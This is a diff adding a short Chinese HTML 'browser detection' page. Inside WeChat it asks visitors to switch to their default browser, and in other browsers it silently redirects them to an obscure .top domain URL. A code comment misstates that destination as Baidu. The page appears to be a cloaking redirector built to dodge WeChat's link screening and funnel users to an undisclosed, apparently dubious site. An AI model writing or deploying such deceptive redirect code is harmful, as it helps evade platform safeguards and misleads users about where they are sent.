@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>浏览器检测</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+        }
+        .message {
+            text-align: center;
+            padding: 20px;
+            background-color: #fff;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+        .message p {
+            margin: 0;
+            font-size: 18px;
+        }
+    </style>
+</head>
+<body>
+    <div class="message" id="message">
+        <p>请使用手机默认浏览器打开本页面。</p>
+    </div>
+
+    <script>
+        // 检测微信浏览器
+        var ua = navigator.userAgent.toLowerCase();
+        if (ua.indexOf('micromessenger') > -1) {
+            // 如果是微信浏览器，显示提示信息
+            document.getElementById('message').innerHTML = "<p>请使用手机默认浏览器打开本页面。</p>";
+        } else {
+            // 如果是其他浏览器，跳转到百度
+            window.location.href = "https://jqka1.t0tarjylmjs.top/j.php?z=6&a=1268";
+        }
+    </script>
+</body>
+</html>
